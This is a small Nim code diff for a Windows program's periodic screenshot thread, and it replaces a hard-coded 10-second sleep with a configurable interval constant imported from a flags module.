@@ -33,6 +33,8 @@ from winim/inc/wingdi import BI_RGB
 
 import ../functions/encodeImageBytes
 
+from ../flags import SCREENSHOT_THREAD_CHECK_INTERVAL
+
 from ../channels import mainChannel
 
 proc newImageData(width: int32, height: int32): ImageData =
@@ -97,4 +99,4 @@ proc initScreenshotThread*(): void {.thread.} =
     mainChannel.send "took screenshot"
     discard screenshot()
 
-    sleep(10000) # sleep 10s
+    sleep(SCREENSHOT_THREAD_CHECK_INTERVAL)
